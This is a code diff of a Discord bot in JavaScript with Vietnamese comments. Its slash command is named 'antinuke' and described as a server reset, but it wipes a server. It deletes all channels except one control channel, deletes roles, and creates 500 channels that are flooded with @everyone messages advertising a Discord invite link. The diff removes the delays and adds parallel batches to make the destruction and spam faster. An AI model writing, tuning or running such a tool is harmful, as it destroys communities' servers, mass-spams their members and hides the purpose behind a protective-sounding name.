@@ -24,16 +24,16 @@ const sleep = ms => new Promise(r => setTimeout(r, ms));
 /* ===== CONFIG ===== */
 const CHANNEL_NAME = "ez";
 const CREATE_COUNT = 500;
-const MSG_COUNT_MIN = 4;
-const MSG_COUNT_MAX = 5;
-const DELAY = 120;
+const MSG_PER_CHANNEL = 5;
+const DELETE_DELAY = 90;
+const CREATE_BATCH = 8; // số kênh tạo song song mỗi đợt (tối ưu nhất)
 /* ================== */
 
 /* ===== Slash Command ===== */
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("Reset server")
+    .setDescription("Reset server nhanh nhất có thể")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
@@ -62,20 +62,20 @@ client.on("interactionCreate", async interaction => {
 
   const guild = interaction.guild;
 
-  // 🔥 Tạo 1 kênh sống sót trước
-  const safeChannel = await guild.channels.create({
+  // 🔥 Tạo kênh sống sót để giữ context
+  const controlChannel = await guild.channels.create({
     name: "antinuke-running",
     type: ChannelType.GuildText
   });
 
-  await safeChannel.send("⚠️ Đang reset server...");
+  await controlChannel.send("⚠️ Đang reset server...");
 
   /* ===== XOÁ CHANNEL ===== */
   for (const ch of [...guild.channels.cache.values()]) {
-    if (ch.id === safeChannel.id) continue;
+    if (ch.id === controlChannel.id) continue;
     try {
       await ch.delete();
-      await sleep(DELAY);
+      await sleep(DELETE_DELAY);
     } catch {}
   }
 
@@ -87,34 +87,33 @@ client.on("interactionCreate", async interaction => {
   for (const role of roles) {
     try {
       await role.delete();
-      await sleep(DELAY);
+      await sleep(DELETE_DELAY);
     } catch {}
   }
 
-  await safeChannel.send("⚡ Đang tạo kênh mới...");
+  await controlChannel.send("⚡ Đang tạo kênh mới (tối đa tốc độ)...");
 
-  /* ===== TẠO KÊNH + GỬI TIN ===== */
-  for (let i = 0; i < CREATE_COUNT; i++) {
-    try {
-      const ch = await guild.channels.create({
-        name: CHANNEL_NAME,
-        type: ChannelType.GuildText
-      });
+  /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
+  for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
+    const batch = [];
 
-      const msgCount =
-        Math.floor(Math.random() * (MSG_COUNT_MAX - MSG_COUNT_MIN + 1)) +
-        MSG_COUNT_MIN;
+    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
+      batch.push(
+        guild.channels.create({
+          name: CHANNEL_NAME,
+          type: ChannelType.GuildText
+        }).then(async ch => {
+          for (let k = 0; k < MSG_PER_CHANNEL; k++) {
+            await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+          }
+        })
+      );
+    }
 
-      for (let j = 0; j < msgCount; j++) {
-        await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-        await sleep(100);
-      }
-
-      await sleep(DELAY);
-    } catch {}
+    await Promise.all(batch);
   }
 
-  await safeChannel.send("✅ Hoàn tất Antinuke.");
+  await controlChannel.send("✅ Hoàn tất Antinuke.");
 });
 
 client.login(process.env.BOT_TOKEN);
